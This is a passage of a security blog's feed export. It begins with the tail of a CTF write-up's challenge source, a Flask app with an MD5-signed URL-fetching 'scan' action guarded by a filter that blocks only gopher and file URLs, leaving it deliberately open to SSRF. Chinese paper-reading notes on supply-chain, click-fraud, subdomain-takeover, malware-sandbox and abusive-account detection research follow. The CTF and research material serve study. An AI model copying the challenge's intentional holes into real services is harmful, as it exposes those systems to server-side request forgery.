<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">9999</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - Supply-Chain Vulnerability Elimination via Active Learning and Regeneration</title>
      <link href="/2021/09/28/Supply-Chain%20Vulnerability%20Elimination%20via%20Active%20Learning%20and%20Regeneration/"/>
      <url>/2021/09/28/Supply-Chain%20Vulnerability%20Elimination%20via%20Active%20Learning%20and%20Regeneration/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>原文作者：N Vasilakis, A Benetopoulos, S Handa</em></p><p><em>原文标题：Supply-Chain Vulnerability Elimination via Active Learning and Regeneration</em></p><p><em>原文链接：<a href="http://nikos.vasilak.is/p/harp:ccs:2021.pdf">http://nikos.vasilak.is/p/harp:ccs:2021.pdf</a></em></p><p><em>原文来源：CCS 2021</em></p><p><em>笔记作者：outx</em></p></blockquote><h2 id="0x01-Intro"><a href="#0x01-Intro" class="headerlink" title="0x01 Intro"></a>0x01 Intro</h2><p>网络攻防发展至今，攻破软件直接实现攻击愈发困难，软件供应链攻击应运而生。攻击者往往不会直接针对这些软件发起攻击，而是转为对其供应商发起攻击，利用这些软件中或多或少/直接或间接依赖于供应商这一基本情况，有目的地向这些供应商所提供的组件代码中插入其精心构造的恶意代码，以此达到成功植入后门等目的。<br>由于一系列原因，诸如软件开发者没办法对其集成的所有组件的代码进行人工审查，即便是那些被广泛使用，传播度极高的组件也有将漏洞引入软件中的真实案例。</p><p>为了这些已经被攻陷的组件不被安全人员检测到，通常情况下这些漏洞仅会在非常特定的执行上下文中触发，并表现出恶意行为（例如窃取敏感数据，隐蔽执行命令等）。所以最为常见的情况是，软件仅能够观察到组建的功能行为，这里指的是组件返回的结果，但并不能够观察到组件在执行过程中可能会出现的一些恶意行为。</p><p>在这种情况下，作者研究了一种新方法来消除软件组件中可能存在的漏洞，以此来消除潜在的供应链攻击风险。这种方法首先假定采用一个不完整的组件（被攻击者植入后门），在完全受控的环境中研究其行为，然后学习其功能行为（为了排除掉漏洞那部分带来的行为特征），然后利用学习到的模型重新生成该组件的新版本，这种方法作者称其为ALR（active library learning and re-generation）。作者设计了一个系统，Harp，它主要是通过应用上述方法来自动生成一些广泛使用的字符串相关组件的无漏洞版本，以及建立在这些组件之上的一些高阶组件的无漏洞版本。</p><p><strong>部署阶段</strong><br>Harp支持一系列的部署方式，主要分成两类：</p><ol><li>部署至应用程序开发之前，以获得一个完全安全的基本字符串相关组件集合，这种部署方式可以集成到一个或者多个组织开发的多个应用程序中</li><li>部署至开发过程中，以替换掉先前开发过程中使用的一些不确定的组件</li></ol><p><strong>针对范围</strong><br>作者的方法针对的是那些被广泛使用的流行组件中使用的简单组件，这些组件之所以容易受到攻击主要是：</p><ol><li>这些简单组件被用作于一些高级组件的基石，一旦被攻击者控制，影响范围巨大</li><li>通过这些简单组件来控制那些高级组件，进而控制开发者开发的软件，比直接尝试通过攻击控制高级组件更具有可行性。</li></ol><p>除了上述的那些简单组件，Harp还可以针对那些能够使用DSL（domain-specific language）捕获行为的组件，DSL能够促进组件行为的表示和推理，消除那些无法被表示的恶意行为。</p><h2 id="0x02-Harp"><a href="#0x02-Harp" class="headerlink" title="0x02 Harp"></a>0x02 Harp</h2><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/7b75ac58-73b7-4aa7-9dd6-7a3d68e0cfa7.png"><br>Harp能够回答以下三个问题： </p><ol><li>Harp能够消除真正的漏洞么？<br>作者通过Harp已经成功消除了三个大规模供应链攻击漏洞，其完美地消除了对危险代码的任何依赖。</li><li>ALR时间效率如何？<br>将其应用于17个JavaScript字符串处理组件，Harp在1分钟内学会了14个组件，而所有组件的学习都在1小时内完成了。</li><li>这些再生成的组件有什么特点？<br>再生组件的执行速度相较于原始JavaScript组件浮动于+2%~-7%之间，这些生成的组件没有导入任何东西，完全是基于原生的JavaScript语言。</li><li>ALR适用于除了JavaScript之外的语言么？<br>尝试应用于5个用C/C++编写的组件上，ALR成功以JavaScript再生成了对应的新组件。</li></ol><p>所尝试应用Harp来再生成的JavaScript组件如下：<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/97946507-1937-4b80-a2cd-a7d1632b4725.png"></p><h2 id="0x03-Conclusion"><a href="#0x03-Conclusion" class="headerlink" title="0x03 Conclusion"></a>0x03 Conclusion</h2><p>本文基于目前供应链攻击的泛滥及其影响严重性，提出了一种新的方法，即组件主动学习和再生成，以黑盒的形式推断和重新生成这些组件正常的功能行为，进而再生成安全无漏洞的版本。</p><p>读完整篇文章，读者发现这个方案思路很好，但也存在着一些问题，一是怎么确保再生成的组件能够完整满足源组件的所有输入，在具备正常的行为功能的情况下做到完全相同的输出；二是上述学习过程中如果出现了因为漏洞所引起的输入和输出，那么其生成的所谓无漏洞版本中其实也会存在学习过程中出现的那种漏洞。</p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CCS 2021 </tag>
            
            <tag> Supply Chain Attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - Dissecting Click Fraud Autonomy in the Wild</title>
      <link href="/2021/09/22/Dissecting%20Click%20Fraud%20Autonomy%20in%20the%20Wild/"/>
      <url>/2021/09/22/Dissecting%20Click%20Fraud%20Autonomy%20in%20the%20Wild/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>原文作者：T Zhu, Y Meng, H Hu, X Zhang, M Xue</em></p><p><em>原文标题：Dissecting Click Fraud Autonomy in the Wild</em></p><p><em>原文链接：<a href="https://arxiv.org/pdf/2105.11103.pdf">https://arxiv.org/pdf/2105.11103.pdf</a></em></p><p><em>原文来源：CCS 2021</em></p><p><em>笔记作者：outx</em></p></blockquote><h2 id="0x01-Intro"><a href="#0x01-Intro" class="headerlink" title="0x01 Intro"></a>0x01 Intro</h2><p>首先需要了解的是随着智能手机的普及，移动广告市场快速发展。一般来说，应用程序开发者会将广告商的广告嵌入至他们的APP中，用户点击这些广告后，广告商根据其流量和点击量像这些开发者付费。但这其中存在着一些威胁，即点击欺诈。简而言之，开发者通过点击欺诈策略，模拟用户产生虚假的广告点击事件，以获得额外的广告费。</p><p>目前尚有的两类方法主要是针对用户端和针对广告网络端，前者主要是检查点击模式是否符合特定规则来判定点击的合法性，后者主要是通过流量分析来确定是否是欺诈点击。但不论这两种方法针对的场景是否不同，其都基于一个假设，即欺诈点击和真实用户点击的模式是有区别的。那么，是否存在一种能够模拟真实人类的点击模式并能绕过现有检测方案的欺诈点击策略呢？</p><p>本文中，作者定义这种拟人点击模式为一种点击欺诈策略（以下简称为拟人攻击），其点击模式和流量模式与真实的人类点击几乎相同。具体来说，这类欺诈性应用程序可能会随机化点击坐标/时间间隔，甚至是跟随真实用户的合法行为来产生点击流量，以绕过目前的检测手段。对这类拟人攻击进行大规模静态分析存在着以下技术挑战：</p><ol><li>如何通过定义一组新的特征来区分生成虚假点击的代码和生成合法点击的代码</li><li>基于这些特征，如何才能在正常样本很少的情况下构建一个新系统，用于自动提取这些特征并准确识别欺诈应用程序</li></ol><p>为了应对这些挑战，作者提出了ClickScanner，一个轻量级的静态分析框架，用于自动检测拟人攻击。根据研究发现，拟人攻击主要利用下面四种策略的组合来绕过检测：</p><ol><li>坐标随机化</li><li>触发时间随机化</li><li>跟踪真实用户的合法行为生成虚假点击</li><li>预定义后门,从远程服务器接受点击的坐标和触发条件并自适应地避开检测</li></ol><p><strong>本文的主要贡献：</strong></p><ol><li>设计并实现了ClickScanner用以剖析拟人攻击</li><li>设计实验并证明了ClickScanner的有效性和先进性</li><li>发现并分析了一些点击欺诈的趋势和情况</li></ol><h2 id="0x02-Humanoid-Attack"><a href="#0x02-Humanoid-Attack" class="headerlink" title="0x02 Humanoid Attack"></a>0x02 Humanoid Attack</h2><p>作者为了说明拟人攻击的一些特性及其为什么能够绕过一些现有检测做了以下对比试验。在应用程序的广告横幅上显示点击事件的坐标分布和时间模式。下图为点击事件记录，其中fixed表示固定点击，reply表示重播点击，Humanoid表示拟人点击。</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/acc1c269-a158-4b9e-bfa6-e6786dec50b5.png"></p><p>可以很直观地发现，不论是在坐标分布还是时间模式上，拟人点击是最接近真实人类点击事件的，这也充分说明了这一攻击方式的隐蔽性。</p><h2 id="0x03-ClickScanner"><a href="#0x03-ClickScanner" class="headerlink" title="0x03 ClickScanner"></a>0x03 ClickScanner</h2><p>通过上述分析，我们得知了拟人攻击模式在行为上与真实人类点击是几乎没有差别的，那么现有的检测方案动态地进行分析是效果很差的。但是，尽管这些拟人攻击在行为上被伪装为合法点击，其在字节码级别合法和欺诈应用程序之间的广告点击触发条件和生成过程的差异显著，这便可以作为检测特征为静态检测提供可能性。ClickScanner构造如下图。<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/2f2b2232-52f4-4cda-995b-bac204a59199.png"></p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/0877c1d3-77f8-4cb0-bca3-26be7803107e.png"></p><h2 id="0x04-Conlusion"><a href="#0x04-Conlusion" class="headerlink" title="0x04 Conlusion"></a>0x04 Conlusion</h2><p>本文中，作者首先介绍了一种用于诈骗广告商的欺骗行为，即通过虚拟用户点击事件从广告商处非法获利。在分析了现有的两大类检测方案之后，作者提出了一个问题，如果说存在一种欺诈策略是通过拟人化点击实现的，这种情况下又应该如何检测呢？</p><p>在深入研究之后，作者发现并给这种通过坐标/时间随机化等方法模拟真人点击事件的攻击策略命名为拟人攻击（Humanoid Attack），并提出了ClickScanner。ClickScanner从一些字节码级别的新特征出发，基于静态分析构建依赖关系图（DDG），提取这些关键特征以形成特征向量。最后，构建了一个基于变分自动编码器（VAE）的有效分类器，这个分类器依托于有限的欺诈示例知识，以克服拟人攻击方面的有限知识，有着不错的性能和准确性。</p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CCS 2021 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - Can I Take Your Subdomain? Exploring Same-Site Attacks in the Modern Web</title>
      <link href="/2021/09/14/Can%20I%20Take%20Your%20Subdomain%20Exploring%20Same-Site%20Attacks%20in%20the%20Modern%20Web/"/>
      <url>/2021/09/14/Can%20I%20Take%20Your%20Subdomain%20Exploring%20Same-Site%20Attacks%20in%20the%20Modern%20Web/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>原文作者：M Squarcina, M Tempesta, L Veronese</em></p><p><em>原文标题：Can I Take Your Subdomain? Exploring Same-Site Attacks in the Modern Web</em></p><p><em>原文链接：<a href="https://www.usenix.org/system/files/sec21-squarcina.pdf">https://www.usenix.org/system/files/sec21-squarcina.pdf</a></em></p><p><em>原文来源：USENIX Security 2021</em></p><p><em>笔记作者：outx</em></p></blockquote><h2 id="0x01-Intro"><a href="#0x01-Intro" class="headerlink" title="0x01 Intro"></a>0x01 Intro</h2><p>作者主要描述了一种研究者不太重视的安全风险，即部分针对同级域名控制而产生的破坏cookie安全的威胁隐患，并重新审视了这一类威胁，并分析了相关域攻击者所带来的安全性危害，主要是从：</p><ol><li>引入了相关域攻击者的细粒度定义，主要是根据攻击者发起攻击的位置及其与安全威胁的关联性进行分析，拆解攻击者的攻击能力，并评估这些攻击能力所对应的web攻击条件</li><li>实现了一个工具用于评估相关域攻击者可能对web应用程序安全造成的影响</li></ol><blockquote><p>补充知识</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/c2abe24f-24b3-4cf7-acbf-8e6c84d1f491.png"></p></blockquote><h2 id="0x02-Threat-Model"><a href="#0x02-Threat-Model" class="headerlink" title="0x02 Threat Model"></a>0x02 Threat Model</h2><h3 id="悬空DNS记录"><a href="#悬空DNS记录" class="headerlink" title="悬空DNS记录"></a>悬空DNS记录</h3><p>指域的权威DNS服务器中指向过期资源的记录</p><ul><li>过期的域名：DNS CNAME记录将一个域名(别名)映射到另一个称为规范名称的域名。如果规范名称过期，攻击者可以轻松注册该域，并在别名域下提供任意内容。</li><li>停止提供的服务：第三方服务常常用于扩展网站的功能，就好像blog.example.com代表一个wordpress博客，但是如果服务提供商没有明确验证域所有权，攻击者可以把任何具有有效DNS记录的子域映射到自己的账户。加之，站点管理员通常会使用通配符来简化配置过程，这就造成了攻击者可以绑定一些自定义的子域。</li><li>已去除的云实例：主要指的是利用那些云中可用的悬空DNS记录。</li></ul><h3 id="动态DNS服务"><a href="#动态DNS服务" class="headerlink" title="动态DNS服务"></a>动态DNS服务</h3><p>许多服务提供商允许用户在特定子域下创建网站，例如github上的&lt;username&gt;.github.io。如果PSL中包含父域，则承载用户提供的内容的子域彼此不相关，如github.io</p><h3 id="已沦陷主机"><a href="#已沦陷主机" class="headerlink" title="已沦陷主机"></a>已沦陷主机</h3><p>攻击可用一些脆弱的服务直接对主机发起攻击，然后从一个特权位置开始对一个更加敏感的网站进行攻击</p><h2 id="0x03-Analysis-Methodology"><a href="#0x03-Analysis-Methodology" class="headerlink" title="0x03 Analysis Methodology"></a>0x03 Analysis Methodology</h2><h3 id="过期域名"><a href="#过期域名" class="headerlink" title="过期域名"></a>过期域名</h3><p>给定一个以CNAME记录开头的解析链，检查其是否指向一个无法解析的资源，并提取链末端规范名称的eTLD+1。如果根域上的whois没有匹配结果的话，直接查询GoDaddy检测是否可以直接购买该域名。</p><h3 id="停止提供的服务"><a href="#停止提供的服务" class="headerlink" title="停止提供的服务"></a>停止提供的服务</h3><p>直接尝试解析&lt;none&gt;.test.example.com的CNAME或DNS记录，就可以检测test.example.com的DNS通配符，确定安全性，其中none为完全随机的字符串</p><h3 id="已去除的云实例"><a href="#已去除的云实例" class="headerlink" title="已去除的云实例"></a>已去除的云实例</h3><p>首先测试了数据集中的每个(子)域，以检查指向的IP是否包含在任何云IP范围中。主要是通过ping一个IP是来判断这个IP是否存活。</p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> USENIX Security 2021 </tag>
            
            <tag> Domain </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - LiSa - Multiplatform Linux Sandbox for Analyzing IoT Malware</title>
      <link href="/2021/08/31/LiSa%20-%20Multiplatform%20Linux%20Sandbox%20for%20Analyzing%20IoT%20Malware/"/>
      <url>/2021/08/31/LiSa%20-%20Multiplatform%20Linux%20Sandbox%20for%20Analyzing%20IoT%20Malware/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>原文作者：D Uhrıcek</em></p><p><em>原文标题：LiSa - Multiplatform Linux Sandbox for Analyzing IoT Malware</em></p><p><em>原文链接：<a href="http://excel.fit.vutbr.cz/submissions/2019/058/58.pdf">http://excel.fit.vutbr.cz/submissions/2019/058/58.pdf</a></em></p><p><em>原文来源：2020 - excel.fit.vutbr.cz</em></p><p><em>笔记作者：outx</em></p></blockquote><h2 id="0x01-Introduction"><a href="#0x01-Introduction" class="headerlink" title="0x01 Introduction"></a>0x01 Introduction</h2><p>目前针对Windows平台的沙箱已经较成熟，例如热门的Cuckoo。而Linux下有Limon/REMnux/Padawan等，但这些分析软件或多或少受到限制。作者提出了一个新的产品-LiSa，提供了完整的分析环境，包含静态、动态和网络分析、同时还能利用yara、json编写规则进行扩展。</p><h2 id="0x02-Program-Tracing"><a href="#0x02-Program-Tracing" class="headerlink" title="0x02 Program Tracing"></a>0x02 Program Tracing</h2><p>作者利用strace工具进行系统调用的追踪。这个工具忽略用户级的调用而专注于内核级的追踪。</p><h2 id="0x03-Implementation"><a href="#0x03-Implementation" class="headerlink" title="0x03 Implementation"></a>0x03 Implementation</h2><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/09324eb4-652f-453d-9939-1421d2382525.png"></p><p>主要实现方法：</p><ul><li>Python（模块化系统、分析用的Pipeline、Web API）</li><li>bash（构建系统）</li><li>C++（解析网络数据）</li></ul><p>简而言之，是采用hook syscall的方式来进行追踪。而构造沙盒的方式则是利用了Docker技术，统一管理则是用了Docker compose。</p><h2 id="0x03-Conclusion"><a href="#0x03-Conclusion" class="headerlink" title="0x03 Conclusion"></a>0x03 Conclusion</h2><p>总的来说，作者的思路和我拟定的论文扩展思路类似，首先构建虚拟环境，然后在虚拟环境中进行进程追踪(利用strace)，以确定进程行为。最后，结合预定的行为组合判断包的恶意性。</p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Malware Detection </tag>
            
            <tag> Trace Syscall </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - Deep entity classification: Abusive account detection for online social networks</title>
      <link href="/2021/08/09/Deep%20entity%20classification%20-%20Abusive%20account%20detection%20for%20online%20social%20networks/"/>
      <url>/2021/08/09/Deep%20entity%20classification%20-%20Abusive%20account%20detection%20for%20online%20social%20networks/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>原文作者：T Xu, G Goossen, HK Cevahir, S Khodeir, Y Jin</em></p><p><em>原文标题：Deep entity classification: Abusive account detection for online social networks</em></p><p><em>原文链接：<a href="https://www.usenix.org/system/files/sec21summer_xu.pdf">https://www.usenix.org/system/files/sec21summer_xu.pdf</a></em></p><p><em>原文来源：USENIX Security 2021</em></p><p><em>笔记作者：outx</em></p></blockquote><h2 id="0x01-Introduction"><a href="#0x01-Introduction" class="headerlink" title="0x01 Introduction"></a>0x01 Introduction</h2><p>在线社交网络中存在着一些账户被滥用的情况，作者以此提出了Deep Entity Classification(DEC)，主要是从更深层次上检测那些能够规避传统账户滥用检测的账户。主要有以下几方面：</p><ul><li>通过聚合账户在社交图结构中的直接及间接邻居的属性和行为特征，提取账户的“深层特征”</li><li>采用“多阶段多任务学习”（MS-MTL）范式，利用不精确的ground truth，在不同的阶段，消耗少量高精度的人工标记样本和大量低精度的自动标记样本。这种体系结构将产生一个单一的模型，为多种类型的滥用账户提供了高精度的分类。</li><li>通过各种抽样和重新分类策略，减少系统负荷，最终统计规模达数十亿用户。<br>总的来说DEC旨在通过在社交图上采用攻击者难以操纵的稀疏聚合特征以及使用多阶段训练框架来进一步减少这些滥用账户。</li></ul><h2 id="0x02-DEC"><a href="#0x02-DEC" class="headerlink" title="0x02 DEC"></a>0x02 DEC</h2><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/b098f4ae-f9a2-4be1-b334-ba7378802cec.png"></p><h3 id="Online-Component"><a href="#Online-Component" class="headerlink" title="Online Component"></a>Online Component</h3><p>DEC由Facebook用户行为触发。当一个动作发生时，DEC可以基于启发式调度与用户活动同时进行的任务，以开始提取目标节点和采样相邻节点的原始特征。特征提取后，DEC将原始特征聚合成数字稀疏特征。然后，DEC根据聚合的特征和模型生成账户的分类结果。</p><h3 id="Offline-Component"><a href="#Offline-Component" class="headerlink" title="Offline Component"></a>Offline Component</h3><p>DEC 的离线组件包括模型训练和反馈处理。 为了对多种类型的滥用进行分类，DEC 维护了多个模型，其中每个模型处理不同类型的滥用。每个专用模型都在从作为并发特征提取（在线组件）的一部分收集的原始特征中学习到的低维嵌入上进行训练。</p><p>总的来说，DEC主要做了：</p><ol><li>提取 Facebook 上所有活跃账户的“深度特征”以进行分类</li><li>使用分类来预测所有活跃账户的滥用程度，总是对所有积极参与网络的用户进行分类，并维持最新的分类结果</li><li>结合用户和标签的反馈来迭代分类器模型</li></ol><h2 id="0x03-Deep-Feature-Extraction"><a href="#0x03-Deep-Feature-Extraction" class="headerlink" title="0x03 Deep Feature Extraction"></a>0x03 Deep Feature Extraction</h2><p>特征提取是DEC的核心部分。与传统的滥用检测系统相比，DEC使用聚合特征计算过程，旨在提取“目标”账户的深层特征</p><h3 id="Deep-features"><a href="#Deep-features" class="headerlink" title="Deep features"></a>Deep features</h3><p>在DEC的上下文中，“深度”是指在社交图谱中散开的过程。该图不仅包含用户，还包含平台支持的所有实体，例如群组、帖子等。直接特征是仅与特定实体相关的特征，例如帐户年龄或组大小。深度特征是一种特征，它是与相关实体相关联的实体的直接特征的函数。例如，“一个帐户的朋友的平均年龄”是该帐户的一个深层特征。 深度特征可以递归定义，作为关联账户深度特征的聚合。例如，照片上的一个深层特征可以是“照片中标记的人的朋友加入的群组的平均数量”</p><p>换句话说，深度特征主要指的是那些潜在的，账户滥用者没办法轻易操控的。例如，账户好友的平均年龄等。</p><p>下标列出了DEC考虑的一些实体类型，包括用户、群组、设备、照片、状态更新和群组帖子<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/6d0e2f7a-e2af-4e24-97ff-7a82520c085c.png"></p><h3 id="Feature-selection"><a href="#Feature-selection" class="headerlink" title="Feature selection"></a>Feature selection</h3><p>在DEC中进行分类时，作者只使用目标账户的深层特征，而不是直接特征。主要原因是直接目标帐户特征极有可能成为模型中的主导特征。</p><h2 id="0x04-Multi-Stage-Multi-Task-Learning"><a href="#0x04-Multi-Stage-Multi-Task-Learning" class="headerlink" title="0x04 Multi-Stage Multi-Task Learning"></a>0x04 Multi-Stage Multi-Task Learning</h2><p>MTL 使用单个神经网络模型并行训练多个相关的“任务”。 核心思想是模型为每个任务学习的东西可以提高其他任务的性能。在我们滥用帐户分类的背景下，“任务”和“标签”定义如下：</p><ul><li>任务是指对OSN上特定类别的滥用帐户进行分类（例如，伪造帐户、垃圾邮件帐户）</li><li>训练样本的标签是一个布尔值，指示样本是否属于滥用帐户类别。每个训练示例都有多个标签，每个任务一个。此多标签由布尔值向量表示</li></ul><h3 id="Model-Training-Flow"><a href="#Model-Training-Flow" class="headerlink" title="Model Training Flow"></a>Model Training Flow</h3><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/fe7e4f78-f42b-4119-8c87-f7f806a501c0.png"></p><p><strong>First Stage: Low Precision Training</strong></p><p>第一个训练阶段的目标是将聚合的原始深度特征的高维向量减少为低维embedding向量。</p><p><strong>Second Stage: High Precision Training</strong></p><p>利用转移学习中的技术，从第一阶段模型中提取最后一个隐藏层的输出，作为第二阶段的输入。使用高精度的人类标记数据对第二阶段（GBDT模型）进行训练，以对滥用账户进行分类，而不考虑违规的子类型。GBDT模型输出的分数为最终DEC分类分数。</p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> USENIX Security 2021 </tag>
            
            <tag> OSN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - Towards Detection of Software Supply Chain Attacks by Forensic Artifacts</title>
      <link href="/2021/07/28/Towards%20Detection%20of%20Software%20Supply%20Chain%20Attacks/"/>
      <url>/2021/07/28/Towards%20Detection%20of%20Software%20Supply%20Chain%20Attacks/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>原文作者：M Ohm, A Sykosch, M Meier</em></p><p><em>原文标题：Towards Detection of Software Supply Chain Attacks by Forensic Artifacts</em></p><p><em>原文链接：<a href="https://doi.org/10.1145/3407023.3409183">https://doi.org/10.1145/3407023.3409183</a></em></p><p><em>原文来源：ARES &#39;20</em></p><p><em>笔记作者：outx</em></p></blockquote><h2 id="0x01-Introduction"><a href="#0x01-Introduction" class="headerlink" title="0x01 Introduction"></a>0x01 Introduction</h2><p>现有针对软件供应链攻击的检测大多侧重于检测那些存在漏洞、易受到攻击的开源软件包，并没有很明确地考虑那些带有恶意性的软件包所造成的软件供应链攻击。作者发现恶意软件包通常会在安装的时候引入大量新的敏感操作，这与该软件包正常的版本安装时截然不同。基于这个发现，作者提出了Buildwatch，这是一种动态分析软件及其第三方依赖的框架。</p><h2 id="0x02-Methodology"><a href="#0x02-Methodology" class="headerlink" title="0x02 Methodology"></a>0x02 Methodology</h2><p>本文主要是从开源软件包中提取和分析那些敏感操作，例如在安装这个软件包的时候创建一个文件或是连接到某一个主机等行为。作者主要关注的是同一个软件包的恶意版本和良性版本之间的对比差异，并且提出了下列假设：</p><p><strong>恶意软件包由于引入了这些敏感操作会产生显著的变化</strong></p><p>这一部分的用于人工审查的候选包包括那些过去被攻击过的和被公开披露定性为恶意的，以及现有被相关漏洞影响的和在安装过程中有恶意行为的软件包。所有选中的包如下图：</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/9131c2e5-150d-45da-90d7-519b14b54870.png"></p><p>作者使用了Cuckoo作为沙箱来测试这些软件包，并在沙箱中安装这些包，然后观察其系统调用等情况。具体系统调用和其标志位如下图：</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/4158690d-4de4-425d-9014-a7f71bff61f4.png"></p><p>有了上述概念后，下面是一个将python的代码对应到系统调用的直观实例：</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/93608592-164d-4c0c-b0ef-a928e6f3cae4.png"></p><h2 id="0x03-Buildwatch"><a href="#0x03-Buildwatch" class="headerlink" title="0x03 Buildwatch"></a>0x03 Buildwatch</h2><p><img 